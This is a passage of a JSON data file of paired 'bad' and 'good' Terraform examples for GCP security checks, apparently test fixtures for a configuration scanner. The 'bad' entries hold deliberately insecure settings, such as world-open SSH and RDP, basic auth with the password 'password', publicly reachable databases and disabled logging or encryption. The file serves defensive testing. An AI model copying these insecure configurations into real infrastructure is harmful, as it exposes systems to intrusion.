    "description": "OS Login not overridden or enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-ip-forward\nresource \"google_compute_instance\" \"fail\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    can_ip_forward = true\n}",
    "language": "hcl",
    "description": "IP forwarding enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-ip-forward\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n}\n\n# ok: gcp-compute-ip-forward\nresource \"google_compute_instance\" \"success2\" {\n    name         = \"gke-test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    can_ip_forward = false\n}",
    "language": "hcl",
    "description": "IP forwarding disabled or not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-shielded-vm\nresource \"google_compute_instance\" \"fail1\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n}\n\n# ruleid: gcp-compute-shielded-vm\nresource \"google_compute_instance\" \"fail2\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    shielded_instance_config {\n        enable_integrity_monitoring = false\n    }\n}",
    "language": "hcl",
    "description": "shielded instance config not set or integrity monitoring disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-shielded-vm\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n    shielded_instance_config {\n        enable_vtpm = true\n        enable_integrity_monitoring = true\n    }\n}",
    "language": "hcl",
    "description": "shielded VM enabled with vTPM and integrity monitoring"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-firewall-unrestricted-ingress-22\nresource \"google_compute_firewall\" \"allow_ssh_int\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [22]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}\n\n# ruleid: gcp-compute-firewall-unrestricted-ingress-22\nresource \"google_compute_firewall\" \"allow_multiple\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"1024-65535\", \"22\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}",
    "language": "hcl",
    "description": "SSH open to world"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-firewall-unrestricted-ingress-22\nresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ssh\"]\n}",
    "language": "hcl",
    "description": "SSH restricted to specific IPs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-compute-firewall-unrestricted-ingress-3389\nresource \"google_compute_firewall\" \"allow_rdp_int\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [3389]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}",
    "language": "hcl",
    "description": "RDP open to world"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-compute-firewall-unrestricted-ingress-3389\nresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3389\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n}",
    "language": "hcl",
    "description": "RDP restricted to specific IPs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-legacy-auth-enabled\nresource \"google_container_cluster\" \"fail\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  enable_legacy_abac = true\n}",
    "language": "hcl",
    "description": "legacy ABAC enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-legacy-auth-enabled\nresource \"google_container_cluster\" \"success\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n}",
    "language": "hcl",
    "description": "legacy ABAC not enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-private-cluster-config\nresource \"google_container_cluster\" \"fail\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n}",
    "language": "hcl",
    "description": "no private cluster config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-private-cluster-config\nresource \"google_container_cluster\" \"success\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  private_cluster_config {\n    enable_private_endpoint = false\n    enable_private_nodes    = false\n    master_ipv4_cidr_block  = \"10.0.0.0/28\"\n  }\n}",
    "language": "hcl",
    "description": "private cluster configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-cluster-logging\nresource \"google_container_cluster\" \"fail\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    remove_default_node_pool = true\n    initial_node_count = 1\n    logging_service = \"none\"\n    master_auth  {\n        username = \"\"\n        password= \"\"\n        client_certificate_config {\n            issue_client_certificate = false\n        }\n    }\n}",
    "language": "hcl",
    "description": "logging disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-cluster-logging\nresource \"google_container_cluster\" \"success\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    remove_default_node_pool = true\n    initial_node_count = 1\n    master_auth {\n        username = \"\"\n        password = \"\"\n        client_certificate_config {\n            issue_client_certificate = false\n        }\n    }\n}",
    "language": "hcl",
    "description": "default logging or explicitly enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-network-policy-enabled\nresource \"google_container_cluster\" \"fail\" {\n  name = \"google_cluster\"\n  network_policy {\n    enabled = false\n  }\n}",
    "language": "hcl",
    "description": "network policy disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-network-policy-enabled\nresource \"google_container_cluster\" \"pass\" {\n  name = \"google_cluster\"\n  network_policy {\n    enabled = true\n  }\n}\n\n# ok: gcp-gke-network-policy-enabled\nresource \"google_container_cluster\" \"pass2\" {\n  name              = \"google_cluster\"\n  datapath_provider = \"ADVANCED_DATAPATH\"\n  network_policy {\n    enabled = false\n  }\n}",
    "language": "hcl",
    "description": "network policy enabled or using advanced datapath"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-basic-auth\nresource \"google_container_cluster\" \"fail1\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n\n  timeouts {\n    create = \"30m\"\n    update = \"40m\"\n  }\n}\n\n# ruleid: gcp-gke-basic-auth\nresource \"google_container_cluster\" \"fail2\" {\n  name               = \"google_cluster_bad\"\n  monitoring_service = \"none\"\n  enable_legacy_abac = True\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block   = \"0.0.0.0/0\"\n      display_name = \"The world\"\n    }\n  }\n\n  master_auth {\n    username = \"test\"\n    password = \"password\"\n  }\n\n}",
    "language": "hcl",
    "description": "basic auth with username/password or no master_auth config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-basic-auth\nresource \"google_container_cluster\" \"pass\" {\n  name               = \"google_cluster\"\n  monitoring_service = \"monitoring.googleapis.com\"\n  master_authorized_networks_config {}\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n}\n\n# ok: gcp-gke-basic-auth\nresource \"google_container_cluster\" \"pass2\" {\n  name               = \"google_cluster\"\n  monitoring_service = \"monitoring.googleapis.com\"\n  master_authorized_networks_config {}\n  master_auth {\n    username = \"\"\n    password = \"\"\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n}",
    "language": "hcl",
    "description": "basic auth disabled with empty credentials or client certificate config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-master-authz-networks-enabled\nresource \"google_container_cluster\" \"fail\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n}",
    "language": "hcl",
    "description": "no master authorized networks"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-master-authz-networks-enabled\nresource \"google_container_cluster\" \"success\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block   = \"73.35.171.194/32\"\n      display_name = \"net1\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "master authorized networks configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-monitoring-enabled\nresource \"google_container_cluster\" \"fail\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    monitoring_service = \"none\"\n  }",
    "language": "hcl",
    "description": "monitoring disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-monitoring-enabled\nresource \"google_container_cluster\" \"success\" {\n  name = \"my-gke-cluster\"\n  location = \"us-central1\"\n  monitoring_service = \"monitoring.googleapis.com\"\n}",
    "language": "hcl",
    "description": "monitoring enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-client-certificate-disabled\nresource \"google_container_cluster\" \"success\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n        issue_client_certificate = true\n    }\n  }\n}",
    "language": "hcl",
    "description": "client certificate enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-client-certificate-disabled\nresource \"google_container_cluster\" \"fail\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n        issue_client_certificate = false\n    }\n  }\n}",
    "language": "hcl",
    "description": "client certificate disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-enabled-vpc-flow-logs\nresource \"google_container_cluster\" \"fail\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n  # enable_intranode_visibility not set\n}",
    "language": "hcl",
    "description": "intranode visibility not enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-enabled-vpc-flow-logs\nresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network                     = var.network\n  subnetwork                  = var.subnetwork\n  enable_intranode_visibility = true\n}",
    "language": "hcl",
    "description": "intranode visibility enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-binary-authorization\nresource \"google_container_cluster\" \"fail1\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n\n  enable_binary_authorization = false\n}",
    "language": "hcl",
    "description": "binary authorization disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-binary-authorization\nresource \"google_container_cluster\" \"success\" {\n  name                        = var.name\n  location                    = var.location\n  initial_node_count          = 1\n  enable_binary_authorization = true\n}",
    "language": "hcl",
    "description": "binary authorization enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-enable-shielded-nodes\nresource \"google_container_cluster\" \"fail\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n\n  enable_shielded_nodes = false\n}",
    "language": "hcl",
    "description": "shielded nodes disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-enable-shielded-nodes\nresource \"google_container_cluster\" \"success2\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n\n  enable_shielded_nodes = true\n}",
    "language": "hcl",
    "description": "shielded nodes enabled or default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-gke-nodepool-auto-repair-enabled\nresource \"google_container_node_pool\" \"fail\" {\n    name = \"my-gke-cluster\"\n    location = \"us-central1\"\n    cluster = \"my-cluster\"\n    management {\n      auto_repair  = false\n      auto_upgrade = false\n    }\n}",
    "language": "hcl",
    "description": "auto-repair disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-gke-nodepool-auto-repair-enabled\nresource \"google_container_node_pool\" \"success\" {\n  name = \"my-gke-cluster\"\n  location = \"us-central1\"\n  cluster = \"my-cluster\"\n  management {\n    auto_repair  = true\n    auto_upgrade = true\n  }\n}",
    "language": "hcl",
    "description": "auto-repair enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-sql-database-require-ssl\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}",
    "language": "hcl",
    "description": "SSL not required"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-sql-database-require-ssl\nresource \"google_sql_database_instance\" \"success\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  ip_configuration {\n      ipv4_enabled = true\n      require_ssl = true\n  }\n}",
    "language": "hcl",
    "description": "SSL required"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-sql-public-database\nresource \"google_sql_database_instance\" \"instance1-fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      ipv4_enabled = true\n      authorized_networks {\n        name  = \"XYZ\"\n        value = \"1.2.3.4\"\n      }\n      authorized_networks {\n        name  = \"Public\"\n        value = \"0.0.0.0/0\"\n      }\n    }\n  }\n}",
    "language": "hcl",
    "description": "public access via 0.0.0.0/0"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-sql-public-database\nresource \"google_sql_database_instance\" \"instance2-pass\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      ipv4_enabled = true\n      authorized_networks {\n        name  = \"XYZ\"\n        value = \"1.2.3.4\"\n      }\n      authorized_networks {\n        name  = \"ABC\"\n        value = \"5.5.5.0/24\"\n      }\n    }\n  }\n}\n\n# ok: gcp-sql-public-database\nresource \"google_sql_database_instance\" \"instance6-pass\" {\n  provider = google-beta\n\n  name   = \"private-instance-${random_id.db_name_suffix.hex}\"\n  region = \"us-central1\"\n\n  depends_on = [google_service_networking_connection.private_vpc_connection]\n\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      ipv4_enabled    = false\n      private_network = google_compute_network.private_network.id\n    }\n  }\n}",
    "language": "hcl",
    "description": "restricted to specific IPs or private network"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-sqlserver-no-public-ip\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  name             = \"general-sqlserver12\"\n  region           = \"us-central1\"\n\n  settings {\n    tier = \"db-custom-1-4096\"\n\n    ip_configuration {\n      ipv4_enabled    = true\n      private_network = \"projects/gcp-bridgecrew-deployment/global/networks/default\"\n      require_ssl     = \"false\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "public IP enabled for SQL Server"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-sqlserver-no-public-ip\nresource \"google_sql_database_instance\" \"pass\" {\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  name             = \"general-sqlserver12\"\n  region           = \"us-central1\"\n\n  settings {\n    tier = \"db-custom-1-4096\"\n\n    ip_configuration {\n      ipv4_enabled    = false\n      private_network = \"projects/gcp-bridgecrew-deployment/global/networks/default\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "public IP disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-postgresql-log-connection\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"POSTGRES_12\"\n  name             = \"general-pos121\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_connections\"\n      value = \"off\"\n    }\n    tier = \"db-custom-1-3840\"\n  }\n}",
    "language": "hcl",
    "description": "log_connections flag set to off"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-postgresql-log-connection\nresource \"google_sql_database_instance\" \"pass1\" {\n  database_version = \"POSTGRES_12\"\n  name             = \"general-pos121\"\n  region           = \"us-central1\"\n  settings {\n    database_flags {\n      name  = \"log_connections\"\n      value = \"on\"\n    }\n    tier         = \"db-custom-1-3840\"\n  }\n}",
    "language": "hcl",
    "description": "log_connections flag set to on"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-project-member-default-service-account-iam-member\nresource \"google_project_iam_member\" \"fail\" {\n    project = \"your-project-id\"\n    role    = \"roles/resourcemanager.organizationAdmin\"\n    member  = \"serviceAccount:test-compute@developer.gserviceaccount.com\"\n}",
    "language": "hcl",
    "description": "default service account used"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-project-member-default-service-account-iam-member\nresource \"google_project_iam_member\" \"success\" {\n    project = \"your-project-id\"\n    role    = \"roles/other\"\n    member  = \"user@mail.com\"\n}",
    "language": "hcl",
    "description": "specific user or service account"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"fail1\" {\n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountTokenCreator\"\n    member  = \"user:jane@example.com\"\n}\n\n# ruleid: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"fail2\" {\n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountUser\"\n    member  = \"user:jane@example.com\"\n}",
    "language": "hcl",
    "description": "dangerous SA roles assigned"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"success\" {\n    project = \"your-project-id\"\n    role    = \"roles/editor\"\n    member  = \"user:jane@example.com\"\n}",
    "language": "hcl",
    "description": "appropriate roles assigned"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-sub-network-logging-enabled\nresource \"google_compute_subnetwork\" \"default\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.0.0.0/16\"\n  network       = \"google_compute_network.vpc.id\"\n}",
    "language": "hcl",
    "description": "no log_config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-sub-network-logging-enabled\nresource \"google_compute_subnetwork\" \"enabled\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.0.0.0/16\"\n  network       = \"google_compute_network.vpc.self_link\"\n\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}",
    "language": "hcl",
    "description": "log_config configured"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-project-default-network\nresource \"google_project\" \"fail\" {\n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n}",
    "language": "hcl",
    "description": "default network auto-created"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-project-default-network\nresource \"google_project\" \"pass\" {\n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n    auto_create_network   = false\n}",
    "language": "hcl",
    "description": "default network disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-kms-prevent-destroy\nresource \"google_kms_crypto_key\" \"fail\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"15552000s\"\n\n  lifecycle {\n    prevent_destroy = false\n  }\n}\n\n# ruleid: gcp-kms-prevent-destroy\nresource \"google_kms_crypto_key\" \"fail2\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"15552000s\"\n}",
    "language": "hcl",
    "description": "prevent_destroy not set or false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-kms-prevent-destroy\nresource \"google_kms_crypto_key\" \"pass\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"15552000s\"\n\n  lifecycle {\n    prevent_destroy = true\n  }\n}",
    "language": "hcl",
    "description": "prevent_destroy enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-memory-store-for-redis-auth-enabled\nresource \"google_redis_instance\" \"fail1\" {\n  name           = \"my-fail-instance1\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 1\n\n  location_id             = \"us-central1-a\"\n  alternative_location_id = \"us-central1-f\"\n\n  redis_version = \"REDIS_4_0\"\n  display_name  = \"I am insecure\"\n}\n\n# ruleid: gcp-memory-store-for-redis-auth-enabled\nresource \"google_redis_instance\" \"fail2\" {\n  name           = \"my-fail-instance2\"\n  memory_size_gb = 1\n  auth_enabled = false\n}",
    "language": "hcl",
    "description": "auth not enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-memory-store-for-redis-auth-enabled\nresource \"google_redis_instance\" \"pass\" {\n  name           = \"my-pass-instance\"\n  memory_size_gb = 1\n  tier           = \"STANDARD_HA\"\n\n  location_id             = \"us-central1-a\"\n  alternative_location_id = \"us-central1-f\"\n  redis_version           = \"REDIS_6_X\"\n\n  labels = {\n    foo = \"bar\"\n  }\n\n  auth_enabled = true\n}",
    "language": "hcl",
    "description": "auth enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-memory-store-for-redis-intransit-encryption\nresource \"google_redis_instance\" \"fail\" {\n  provider       = google-beta\n  name           = \"mrr-memory-cache\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 5\n\n  redis_version      = \"REDIS_6_X\"\n  display_name       = \"Terraform Test Instance\"\n}\n\n# ruleid: gcp-memory-store-for-redis-intransit-encryption\nresource \"google_redis_instance\" \"fail2\" {\n  provider       = google-beta\n  name           = \"mrr-memory-cache\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 5\n\n  transit_encryption_mode = \"DISABLED\"\n}",
    "language": "hcl",
    "description": "transit encryption disabled or not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-memory-store-for-redis-intransit-encryption\nresource \"google_redis_instance\" \"pass\" {\n  provider       = google-beta\n  name           = \"mrr-memory-cache\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 5\n\n  redis_version      = \"REDIS_6_X\"\n  display_name       = \"Terraform Test Instance\"\n\n  transit_encryption_mode = \"SERVER_AUTHENTICATION\"\n}",
    "language": "hcl",
    "description": "transit encryption enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"fail1\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member  = \"allAuthenticatedUsers\"\n}\n\n# ruleid: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"fail2\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member  = \"allUsers\"\n}",
    "language": "hcl",
    "description": "public access via allUsers or allAuthenticatedUsers"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"pass1\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member = \"user:jane@example.com\"\n}\n\n# ok: gcp-run-private-service-iam-member\nresource \"google_cloud_run_service_iam_member\" \"pass2\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member = \"domain:example.com\"\n}",
    "language": "hcl",
    "description": "access restricted to specific users"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-build-workers-private\nresource \"google_cloudbuild_worker_pool\" \"fail1\" {\n  name = \"my-pool\"\n  location = \"europe-west1\"\n  worker_config {\n    disk_size_gb = 100\n    machine_type = \"e2-standard-4\"\n    no_external_ip = false\n  }\n}\n\n# ruleid: gcp-build-workers-private\nresource \"google_cloudbuild_worker_pool\" \"fail2\" {\n  name = \"my-pool\"\n  location = \"europe-west1\"\n  worker_config {\n    disk_size_gb = 100\n    machine_type = \"e2-standard-4\"\n  }\n}",
    "language": "hcl",
    "description": "external IP enabled or not set"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
    "code": "# ok: gcp-build-workers-private\nresource \"google_cloudbuild_worker_pool\" \"pass\" {\n  name = \"my-pool\"\n  location = \"europe-west1\"\n  worker_config {\n    disk_size_gb = 100\n    machine_type = \"e2-standard-4\"\n    no_external_ip = true\n  }\n}",
    "language": "hcl",
    "description": "no external IP"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: gcp-bigquery-dataset-encrypted-with-cmk\nresource \"google_bigquery_dataset\" \"fail\" {\n  dataset_id                  = \"example_dataset\"\n  friendly_name               = \"test\"\n  description                 = \"This is a test description\"\n  location                    = \"EU\"\n  default_table_expiration_ms = 3600000\n\n  labels = {\n    env = \"default\"\n  }\n\n  access {\n    role          = \"OWNER\"\n    special_group = \"allAuthenticatedUsers\"\n  }\n}",
    "language": "hcl",
    "description": "no encryption configuration"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GCP Terraform Configurations",
    "type": "good",
